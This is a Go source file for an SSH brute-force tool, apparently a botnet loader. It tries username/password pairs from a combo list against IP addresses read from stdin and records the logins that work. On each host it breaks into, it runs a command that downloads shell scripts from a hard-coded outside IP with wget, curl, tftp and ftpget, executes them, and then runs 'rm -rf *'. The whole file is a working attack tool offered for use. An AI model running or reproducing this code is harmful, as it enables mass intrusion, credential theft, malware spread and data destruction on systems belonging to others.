package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	combos      []string
	wg          sync.WaitGroup
	jobQueue    = make(chan string, 100)
	workerLimit = 5
	ipaddrs     = make(map[string]struct{})
	ipaddrsLock sync.Mutex
	command     = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.42.88.254/ohsitsvegawellrip.sh; curl -O http://89.42.88.254/ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp 89.42.88.254 -c get ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; tftp -r ohsitsvegawellrip2.sh -g 89.42.88.254; chmod 777 ohsitsvegawellrip2.sh; sh ohsitsvegawellrip2.sh; ftpget -v -u anonymous -p anonymous -P 21 89.42.88.254 ohsitsvegawellrip1.sh ohsitsvegawellrip1.sh; sh ohsitsvegawellrip1.sh; rm -rf ohsitsvegawellrip.sh ohsitsvegawellrip.sh ohsitsvegawellrip2.sh ohsitsvegawellrip1.sh; rm -rf *"
)

func loadCombos(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open combo file: %w", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			combos = append(combos, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return fmt.Errorf("error reading combo file: %w", err)
	}
	return nil
}

func bruteForce(address string) {
	defer wg.Done()

	ipaddrsLock.Lock()
	if _, exists := ipaddrs[address]; exists {
		ipaddrsLock.Unlock()
		return
	}
	ipaddrs[address] = struct{}{}
	ipaddrsLock.Unlock()

	for _, combo := range combos {
		parts := strings.Fields(combo)
		if len(parts) != 2 {
			fmt.Printf("\x1b[31m[ERROR] Invalid combo format: %s\x1b[37m\n", combo)
			continue
		}
		username, password := parts[0], parts[1]

		sshConfig := &ssh.ClientConfig{
			User:            username,
			Auth:            []ssh.AuthMethod{ssh.Password(password)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}

		connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", address), sshConfig)
		if err != nil {
			continue
		}
		defer connection.Close()

		fmt.Printf("\x1b[32m[SUCCESS] %s:22 %s:%s\x1b[37m\n", address, username, password)

		saveFile, err := os.OpenFile("done.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("\x1b[31m[ERROR] Failed to save result: %v\x1b[37m\n", err)
			return
		}
		defer saveFile.Close()
		_, _ = saveFile.WriteString(fmt.Sprintf("%s:%s:%s\n", address, username, password))

		session, err := connection.NewSession()
		if err != nil {
			fmt.Printf("\x1b[31m[ERROR] Failed to create SSH session: %v\x1b[37m\n", err)
			return
		}
		defer session.Close()

		var output strings.Builder
		session.Stdout = &output
		if err := session.Run(command); err != nil {
			fmt.Printf("\x1b[31m[ERROR] Failed to run command on %s: %v\x1b[37m\n", address, err)
			return
		}

		fmt.Printf("\x1b[33m[OUTPUT] %s: %s\x1b[37m\n", address, output.String())

		outputFile, err := os.OpenFile("output.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("\x1b[31m[ERROR] Failed to save output: %v\x1b[37m\n", err)
			return
		}
		defer outputFile.Close()
		_, _ = outputFile.WriteString(fmt.Sprintf("%s:%s:%s\n%s\n\n", address, username, password, output.String()))

		return
	}
}

func worker() {
	for ip := range jobQueue {
		wg.Add(1)
		go bruteForce(ip)
	}
}

func main() {
	// Load the combo file
	if err := loadCombos("combo.txt"); err != nil {
		fmt.Printf("\x1b[31m[ERROR] %v\x1b[37m\n", err)
		return
	}
	fmt.Printf("\x1b[32mLoaded %d combos\x1b[37m\n", len(combos))

	for i := 0; i < workerLimit; i++ {
		workerLimit = 4
		fmt.Printf("\x1b[34m[INFO] Starting worker %d\x1b[37m\n", i)
		go worker()
		time.Sleep(2 * time.Second)
	}

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip != "" {
			jobQueue <- ip
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("\x1b[31m[ERROR] Failed to read IPs from stdin: %v\x1b[37m\n", err)
	}

	close(jobQueue)
	wg.Wait()

	fmt.Println("\x1b[32mAll tasks completed!\x1b[37m")
}
